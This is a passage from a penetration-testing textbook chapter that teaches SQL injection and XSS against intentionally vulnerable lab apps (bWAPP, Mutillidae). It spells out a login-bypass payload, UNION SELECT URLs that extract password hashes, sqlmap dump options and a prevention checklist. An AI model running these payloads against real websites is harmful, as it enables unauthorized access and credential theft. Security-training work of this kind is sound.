- en: Website Penetration Testing - Gaining Access
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we will dive much further into website and database penetration
    testing than we have so far. As a penetration tester, we need to simulate real-world
    attacks on a target organization's systems and networks, based on the rules of
    engagement. However, while being able to conduct information gathering, such as
    reconnaissance and scanning websites, is excellent, the true challenge comes when
    it's time to break in. It's all well and good preparing to infiltrate an enemy
    base, but all that preparation will come to nothing if you simply stand at a distance
    and do nothing!
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will look at compromising and gaining access to web servers
    and web applications. Additionally, you will learn some hands-on techniques and
    methodologies to discover vulnerabilities and retrieve data.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Exploring the dangers of SQL injection
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: SQL injection vulnerabilities and exploitation
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Cross-site scripting vulnerabilities
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Discovering vulnerabilities automatically
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following are the technical requirements for this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Kali Linux: [https://www.kali.org/](https://www.kali.org/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Windows 7, 8, or 10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'OWASP **Broken Web Applications** (**BWA**) project: [https://sourceforge.net/projects/owaspbwa/](https://sourceforge.net/projects/owaspbwa/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Acunetix: [https://www.acunetix.com/](https://www.acunetix.com/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'bWAPP: [https://sourceforge.net/projects/bwapp/](https://sourceforge.net/projects/bwapp/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploring the dangers of SQL injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As mentioned in the previous chapter ([Chapter 14](7af964cb-4e13-450b-80fa-20e9ef9a9732.xhtml),
    *Performing Website Penetration Testing*), **SQL injection** (**SQLi**) allows
    an attacker to insert a series of malicious SQL code/queries directly into a backend
    database server. This vulnerability allows an attacker to manipulate records by
    adding, removing, modifying, and retrieving entries in a database.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this section, we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: The dangers from SQL injection vulnerabilities
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Bypassing logins using SQL injection vulnerability
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Now, let's look at the dangers of SQL injections in detail.
  prefs: []
  type: TYPE_NORMAL
- en: Dangers from SQL injection vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'A successful SQL injection attack can cause the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Authentication bypass**: Allows a user to gain access to a system without
    valid credentials or privileges'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Information disclosure**: Allows a user to obtain sensitive information'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Compromised data integrity**: Allows a user to manipulate data in a database'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Compromised availability of data**: Prevents legitimate users from accessing
    data on a system'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Remote code execution on a compromised system**: Allows a malicious user
    to run malicious code on a system remotely'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Next, let's take a look at learning how to bypass logins using SQL injection.
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing logins using SQL injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this exercise, we will be using the OWASP BWA virtual machine to demonstrate
    bypassing authentication using SQL injection. To start, power on the OWASP BWA
    virtual machine. After a few minutes, the virtual machine will provide you with
    its IP address.
  prefs: []
  type: TYPE_NORMAL
- en: 'Head on over to your Kali Linux (attacker) machine and follow these steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Enter the IP address of the OWASP BWA virtual machine in the web browser of
    Kali Linux.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Click on the **OWASP Mutillidae II** application, as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/f1717a7a-4a87-4e02-be65-02f316d8184e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Navigate to the following page: OWASP 2013 | A2 - Broken Authentication and
    Session Management | Authentication Bypass | Via SQL Injection | Login:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/b115b27e-7329-4a6d-815a-f394dfec0cfd.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Enter any one of the following characters in the **Username** field:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`**''**`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`**/**`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`**--**`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`**\**`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`**.**`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: If an error occurs, examine the message produced by the server.
  prefs: []
  type: TYPE_NORMAL
- en: If no errors occur on the login page of the website, try using true or false
    statements, such as `1=1 --` or **`1=0 --`**.
  prefs: []
  type: TYPE_NORMAL
- en: 'When we run this, something similar to the following error should appear. If
    you look closely, you can see the query that was used between the web server application
    and the database, `SELECT username FROM accounts WHERE username= '' '' '' ;`,
    as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/a2d052df-0d22-4666-b476-ca23429aed7c.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The following can be determined from the SQL query:'
  prefs: []
  type: TYPE_NORMAL
- en: 'The `SELECT` statement is used to retrieve information from a relational database.
    Therefore, the statement begins by saying: `SELECT` the `username` column from
    the table.'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: The `FROM` statement is used to specify the name of the table. In the statement,
    we are specifying the **accounts** table.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The `WHERE` statement is used to specify a field within the table. The query
    indicates the field(s) that has (have) a value equal to `'` (a single quotation
    mark). The `=` (equals) parameter allows us to ensure a specific match in our
    query.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`;` is used to end a SQL statement.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'When combined, the statement reads as follows: Query the `username` column
    within the `accounts` table, and search for any username that is `**''**` (single
    quotation mark).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The `INSERT` command is used to add data. `UPDATE` is used to update data, `DELETE`
    or `DROP` is used to remove data, and `MERGE` is used to combine data within the
    table and/or database.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s attempt to combine some statements. Use the **`'' or 1=1 --`** (there
    is a space after `--`) statement in the **Username** field, and then click on
    **Login**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/8dcdeaa1-17d5-45c9-b3d3-d58f1ebfd0c3.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The statement chooses the first record within the table and returns it. Upon
    checking the login status, we can see that we are now logged in as `admin`. This
    means the first record is `admin`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/0aeb18ef-d3fe-4a0f-bc9e-76d3073cd1b4.png)'
  prefs: []
  type: TYPE_IMG
- en: The statement chooses the first record in the table and returns the value, which
    is `admin`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s try another user and modify our code a bit. We will attempt to log in
    as the user `john`. Insert the username `john` for the username field and the
    following SQL command for the password field:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'Ensure that there is a space after the double hyphens (`--`) and hit **Login**
    to execute the commands. The following screenshot shows that we are able to successfully
    log in as the user `john`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/50e354e6-c4cd-4212-9c8a-0ac4cb645a50.png)'
  prefs: []
  type: TYPE_IMG
- en: Those are some techniques you can use to bypass authentication using SQL injection
    attacks on a web server. In the next section, we will cover SQL injection vulnerabilities
    and exploitation.
  prefs: []
  type: TYPE_NORMAL
- en: SQL injection vulnerabilities and exploitation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this section, we are going to explore the following vulnerabilities and
    exploitations using SQL injection:'
  prefs: []
  type: TYPE_NORMAL
- en: Discovering SQL injections with GET
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Reading database information
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Finding database tables
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Extracting sensitive data such as passwords
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'To start discovering SQL injections with GET, use the following instructions:'
  prefs: []
  type: TYPE_NORMAL
- en: Power on the OWASP BWA virtual machine. After a few minutes, the virtual machine
    will provide you with its IP address.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Head on over to your Kali Linux (attacker) machine and enter the IP address
    of the OWASP BWA virtual machine in the web browser of Kali Linux.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Click on the **bWAPP** application as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/4dc69b92-0578-4865-a8c4-ed1fe4953881.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Use `bee` for the username and `bug` as the password to log in to the application.
    Then click login:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/25357337-5c86-4788-9715-1c418deaeba8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Select the **SQL Injection (Search/GET)** option as shown here and click **Hack**
    to continue:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/367d8a9e-363e-4285-b6a8-026ae4861c92.png)'
  prefs: []
  type: TYPE_IMG
- en: 'A search box and table will appear. When you enter data into the search field,
    a GET request is used to retrieve the information from the SQL database and display
    it on the web page. Now, let''s perform a search for all movies that contain the
    string `war`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/82a4d2aa-7ecd-40aa-85b3-f53c20dc10d6.png)'
  prefs: []
  type: TYPE_IMG
- en: '**Disclaimer**: The information visible in the preceding screenshot was retrieved
    from the locally stored database inside the Metasploitable virtual machine; specifically,
    it is within the bWAPP vulnerable web application section. Additionally, the virtual
    machines used are on an isolated virtual network.'
  prefs: []
  type: TYPE_NORMAL
- en: Looking closely at the URL in the web browser, we can see that `sqli_1.php?title=war&action=search`
    was used to return/display the results to us from the database.
  prefs: []
  type: TYPE_NORMAL
- en: 'If we use the `1''` character within the search field, we''ll get the following
    error when using `sqli_1.php?title=1''&action=search`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/98184d34-39c8-4867-b10e-e14983e270a6.png)'
  prefs: []
  type: TYPE_IMG
- en: This error indicates that the target is vulnerable to SQL injection attacks.
    The error states that there's an issue with the syntax that we have inserted in
    the search field. Furthermore, the error reveals that the database is a MySQL
    server. Such revealing errors should not be made known to users in this way. Database
    errors should only be accessible to the database administrator/developer or another
    responsible person. This is a sign of a misconfiguration between the web application
    and the database server.
  prefs: []
  type: TYPE_NORMAL
- en: 'Adjusting the URL to `http://192.168.56.101/bWAPP/sqli_1.php?title=1'' order
    by 7-- -`, we get the following response:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/e775c7de-ddd0-4fee-9860-7bcdeea5202e.png)'
  prefs: []
  type: TYPE_IMG
- en: The output indicates that there are at least seven tables. We were able to tell
    this by using `order by 7-- -` in the URL. Notice that, in the next step, when
    we adjust the URL to check for additional tables, we get an error.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s check whether there are eight tables by using the following URL: `http://192.168.56.101/bWAPP/sqli_1.php?title=1''
    order by 8-- -`. As we can see, an error message was returned:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/323bc279-8d5e-47ba-bb84-da0593b1a62a.png)'
  prefs: []
  type: TYPE_IMG
- en: Therefore, we can confirm that we have seven tables.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, we can adjust the URL to `http://192.168.56.101/bWAPP/sqli_1.php?title=1''
    union select 1,2,3,4,5,6,7-- -`. The following screenshot shows the results. The
    web application (bWAPP) returns the values `2`, `3`, `5`, and `4` in the same
    row. We can, therefore, determine that tables `2`, `3`, `4`, and `5` are vulnerable
    to attack:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/98ad17d6-f08d-4d9e-84de-871bb24941c2.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To check the database version, we can substitute `@@version` in place of a
    vulnerable table within the following URL, getting `http://192.168.56.101/bWAPP/sqli_1.php?title=1''
    union select 1, @@version,3,4,5,6,7-- -`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/dd33688b-c824-4c75-ae8a-c456bba50eac.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We can now attempt to get the table names by using the following URL `http://192.168.56.101/bWAPP/sqli_1.php?title=1''
    union select 1,table_name,3,4,5,6,7 from information_schema.tables-- -`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/d7ed96cb-695a-4fa9-9cc5-ae2cad9596fc.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, we have all the tables within the database. The following tables are created
    by the developer:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/d83a745e-bd75-4e27-8ff2-f9e026eec4e7.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We will now attempt to retrieve user credentials from the `users` table. Firstly,
    we''ll need to get the name of the column from the users table. There is a small
    issue that you may encounter with PHP magic methods: the error does not allow
    us to insert/query strings in the PHP magic method. For example, we will not be
    able to retrieve information from the `users` table if we insert the `users` string
    within the URL, meaning the database would not return any columns. To bypass this
    error, convert the `users` string into ASCII. The ASCII value of `users` is **117
    115 101 114 115**.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now, we can proceed to retrieve the columns from the `users` table only. We
    can use the following URL: `http://192.168.56.101/bWAPP/sqli_1.php?title=1'' union
    select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name=char(117,115,101,114,115)--
    -`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/ab801668-4069-4176-ad37-e2c2795ca39d.png)'
  prefs: []
  type: TYPE_IMG
- en: '`Char()` allows SQL injection to insert statements in MySQL without using double
    quotes (`""`).'
  prefs: []
  type: TYPE_NORMAL
- en: 'Using `http://192.168.56.101/bWAPP/sqli_1.php?title=1'' union select 1,login,3,4,5,6,7
    from users-- -`, we can look into the `email` column of the `users` table as described
    in *Step 14*:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/a9404840-c8c5-414b-9f68-c82e4538f851.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To retrieve the password, adjust the URL to `http://192.168.56.101/bWAPP/sqli_1.php?title=1''
    union select 1,password,3,4,5,6,7 from users-- -`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/b8d3bb1a-b5fb-4e19-abd2-b089848d861d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, we have the hash of the password. We can use either an online or offline
    hash identifier to determine the type of hash:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/14790ef2-d5ac-49cc-bf51-6156bbc9dcd4.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Additionally, you can use an online hash decoder such as **CrackStation** ([https://crackstation.net/](https://crackstation.net/))
    to perform decryption:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/81cb42b8-e5a9-44ee-9c4d-fb4203a05eb5.png)'
  prefs: []
  type: TYPE_IMG
- en: We have successfully retrieved user credentials from the SQL server by manipulating
    SQL statements within the URL of a web browser.
  prefs: []
  type: TYPE_NORMAL
- en: In the following section, we will learn how to detect SQL injections with POST
    on a target server.
  prefs: []
  type: TYPE_NORMAL
- en: Discovering SQL injections with POST
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this exercise, we will attempt to discover whether SQL injection is possible
    with POST. The **POST** method is used to send data to a web server. This method
    is not like the **GET** method, which is used to retrieve data or a resource.
    We will be using the following topology to complete this exercise:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/532081a3-3b69-4443-83e4-11720942af8a.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To start detecting SQL injections with POST, use the following instructions:'
  prefs: []
  type: TYPE_NORMAL
- en: Enable Burp Proxy on your Kali Linux machine and confirm that your web browser
    proxy settings are correct. If you are unsure, please refer to [Chapter 7](075f58ca-ff2a-48c7-9b90-17ddd4e408c9.xhtml),
    *Working with Vulnerability Scanners*, specifically the *Burp Suite* section,
    which contains all the details you need to configure Burp Suite on your Kali Linux
    machine.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Ensure that **Intercept** is enabled on Burp Suite, as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/74cefbdc-7413-40e9-aab8-039535ef7067.png)'
  prefs: []
  type: TYPE_IMG
- en: Open your web browser on Kali Linux and enter the OWASP BWA IP address in the
    address bar.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Be sure to click the **Forward** button regularly on Burp Suite to forward the
    data between the Kali Linux web browser and the OWASP BWA web server.
  prefs: []
  type: TYPE_NORMAL
- en: 'Click on **bWAPP** as shown in the following screenshot. Log in to the **bWAPP**
    portal with the credentials `bee` (username) and `bug` (password). Please note
    that these are the default user credentials for the **bWAPP** virtual machine:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/252ee273-f27c-4cc8-9214-36fe87ab8050.png)'
  prefs: []
  type: TYPE_IMG
- en: 'In the top-right corner, use the drop-down menu to select **SQL Injection (Search/POST)**,
    and then click on **Hack** to load the vulnerability:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/27bd4782-4a1e-467c-b04f-ae15ab3b14c2.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Enter a word in the search field and click on **Search** to submit (post) data:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/341bfc3c-0011-4442-b037-690bc2042362.png)'
  prefs: []
  type: TYPE_IMG
- en: The database will respond by stating whether a movie was found.
  prefs: []
  type: TYPE_NORMAL
- en: On Burp Suite, select the Target | Site map tab to view all the **GET** and
    **POST** messages between your web browser on Kali Linux and the OWASP BWA web
    server.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Select the most recent **POST** message, which should contain the search you
    just performed:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/6be97d31-cd41-499b-84cd-fcbea98e164b.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The following shows the content of this **POST** message:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/6411e822-e04b-430d-b2b2-939a1e3db431.png)'
  prefs: []
  type: TYPE_IMG
- en: Right-click anywhere within the `Raw` content window and select the **Save item**
    option. Save the file on your desktop in Kali Linux as `postdata.txt`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Once the file has been saved successfully, let''s use SQLmap to discover any
    SQL injection (SQLi) vulnerabilities in POST on the target server. Use the following
    command to perform this task:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'SQLmap will attempt to check any/all `POST` parameters and determine whether
    the application is vulnerable. The following shows a number of possible vulnerabilities:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/0cff3574-e7c6-4bbf-ae1e-385b1cb77036.png)'
  prefs: []
  type: TYPE_IMG
- en: 'In the preceding screenshot, SQLmap was able to notice that the `''title''`
    parameter may be vulnerable and that the database may also be a MySQL platform.
    Additionally, the following is an example of an injectable parameter that has
    been found:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/0a9562f0-5ef4-4915-9f2c-03f451eaef02.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The preceding screenshot shows that SQLmap has determined that the `''title''`
    parameter is also vulnerable to SQL injection attacks. Lastly, the following are
    SQLmap payloads:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/6922c792-ea44-4015-a8cd-20dd2b02106e.png)'
  prefs: []
  type: TYPE_IMG
- en: Here, SQLmap provides us with a bit of a summary of what has been tested, how
    it was tested, and the results. With the information that **SQLmap** has given
    us, we know exactly where the target website is vulnerable to SQLi attacks with
    POST and how to leverage weaknesses using specific payloads.
  prefs: []
  type: TYPE_NORMAL
- en: Having completed this exercise, you are now able to use Burp Suite and SQLmap
    to discover SQL injection vulnerabilities in POST messages.
  prefs: []
  type: TYPE_NORMAL
- en: In the next section, you will learn how to use the SQLmap tool to discover SQL
    injections.
  prefs: []
  type: TYPE_NORMAL
- en: Detecting SQL injections and extracting data using SQLmap
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: SQLmap is an automatic SQL injection tool that allows a penetration tester to
    discover vulnerabilities, perform exploitation attacks, manipulate records, and
    retrieve data from a database.
  prefs: []
  type: TYPE_NORMAL
- en: 'To perform a scan using SQLmap, use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'Additionally, the following parameters can be used to perform various tasks:'
  prefs: []
  type: TYPE_NORMAL
- en: '`--dbms=database_type`: Performs a backend brute-force attack. An example is
    `--dbms=mysql`.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--current-user`: Retrieves the current database user.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--passwords`: Enumerates password hashes.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--tables`: Enumerates tables within the database.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--columns`: Enumerates columns within the tables.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`--dump`: Dumps data table entries.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In the following section, we will discuss ways to prevent SQL injection.
  prefs: []
  type: TYPE_NORMAL
- en: Preventing SQL injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we will briefly cover some essential techniques to minimize
    and prevent SQL injection attacks on a system. We'll also look at best practices
    in a simple format.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following techniques can be used to prevent SQL injection attacks:'
  prefs: []
  type: TYPE_NORMAL
- en: Run the database service with minimum privileges.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Monitor all database traffic using a **web application firewall** (**WAF**)
    or IDS/IPS.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Sanitize data.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Filter all client data.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Suppress error messages on the user end.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use custom error messages rather than the default messages.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use safe APIs.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Perform regular black-box penetration on the database server.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Enforce type and length checks using parameter collections on user input; this
    prevents code execution.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In the next section, we will learn about **Cross-Site Scripting** (**XSS**)
    vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Cross-Site Scripting vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As mentioned in the previous chapter, XSS allows an attacker to inject client-side
    scripts into web pages viewed by other users. Therefore, when an unsuspecting
    user visits a web page that contains the malicious scripts, the victim's browser
    will automatically execute these malicious scripts in the background.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this section, we will cover how to discover various XSS vulnerabilities
    by looking at the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Understanding XSS
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Discovering reflected XSS
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Discovering stored XSS
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting XSS – hooking vulnerable page visitors to BeEF
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In the following section, we will learn what XSS is.
  prefs: []
  type: TYPE_NORMAL
- en: Understanding XSS
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As mentioned in the previous chapter, XSS attacks are done by exploiting vulnerabilities
    in a dynamically created web page. This allows an attacker to inject client-side
    scripts into web pages viewed by other users. When an unsuspecting user visits
    a web page that contains XSS, the user's browser will begin to execute the malicious
    script in the background without the victim realizing.
  prefs: []
  type: TYPE_NORMAL
- en: 'In the following exercises, we''ll be using both **WebGoat** and **bWAPP**
    on an OWASP BWA virtual machine:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/74a30c5d-1318-4654-ab44-db4f38e2d253.png)'
  prefs: []
  type: TYPE_IMG
- en: The username/password for **WebGoat** is `guest`/`guest`. The username/password
    for **bWAPP** is `bee`/`bug`.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we will take a look at reflected XSS.
  prefs: []
  type: TYPE_NORMAL
- en: Discovering reflected XSS
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In a reflected XSS attack, data is inserted and then reflected back onto the
    web page. In this exercise, we will walk through the process of discovering a
    reflected XSS vulnerability on a target server.
  prefs: []
  type: TYPE_NORMAL
- en: 'To complete this task, perform the following instructions:'
  prefs: []
  type: TYPE_NORMAL
- en: Navigate to the **bWAPP** application and log in.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Choose **Cross-Site Scripting - Reflected (GET)** and click on **Hack** to
    enable this vulnerability page:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/4a7b6e9b-a189-4c8d-bdaa-2e4c2bcf6251.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Without entering any details in the form, click **Go**. Looking at the URL
    in the address bar of the web browser, you can see that the URL can be edited:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/84b995db-5825-4449-b660-8bab450a5653.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To test whether the field is vulnerable to reflected XSS, we can insert custom
    JavaScript into the **First name** field. Insert the following JavaScript:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'In the **Last name** field, use the following command to close the script:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'The following screenshot shows what you need to do:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/02349b59-a85d-47ab-93fe-ad984c56906b.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Click on **Go** to execute the script on the server. The following pop-up window
    will appear:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/de4069fa-a416-4839-be7b-fb294cf4a768.png)'
  prefs: []
  type: TYPE_IMG
- en: This indicates that the script ran without any issues on the target server;
    therefore, the server is vulnerable to XSS attacks.
  prefs: []
  type: TYPE_NORMAL
- en: In the next section, we will look at stored XSS.
  prefs: []
  type: TYPE_NORMAL
- en: Discovering stored XSS
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In stored XSS, the penetration tester injects malicious code that will be stored
    in the target database.
  prefs: []
  type: TYPE_NORMAL
- en: In this exercise, we will walk through the process of discovering a stored XSS
    vulnerability on a target server.
  prefs: []
  type: TYPE_NORMAL
- en: 'To complete this task, use the following instructions:'
  prefs: []
  type: TYPE_NORMAL
- en: Navigate to the bWAPP application and log in.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Choose **Cross-Site Scripting - Stored (Blog)** and click on **Hack** to enable
    this vulnerability page:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/c8c0b4d1-83fd-4c93-b35d-b6686329f9c2.png)'
  prefs: []
  type: TYPE_IMG
- en: 'You can enter any message within the text field and click Submit. The text
    entered will now be stored within the database, as in an online message board,
    forum, or website with a comments section:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/2d5bd725-8ad3-46f5-9eab-2b9409a0ac4f.png)'
  prefs: []
  type: TYPE_IMG
- en: Additionally, we can see the table, the field, and the columns.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can enter the following script within the text field and click **Submit**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'After submitting the script, you''ll receive the following pop-up window verifying
    that it ran successfully:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/b8b74ea1-6c52-4702-9d03-113931a1d321.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Looking at the table, there is a second row without any actual entry:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/9b131d08-9ccf-4012-bf1a-6a1c1239211b.png)'
  prefs: []
  type: TYPE_IMG
- en: This new entry reflects that our script has been inserted and stored in the
    database. If anyone opens this web page, the script will automatically execute.
  prefs: []
  type: TYPE_NORMAL
- en: In the following section, we will demonstrate how to exploit XSS vulnerabilities
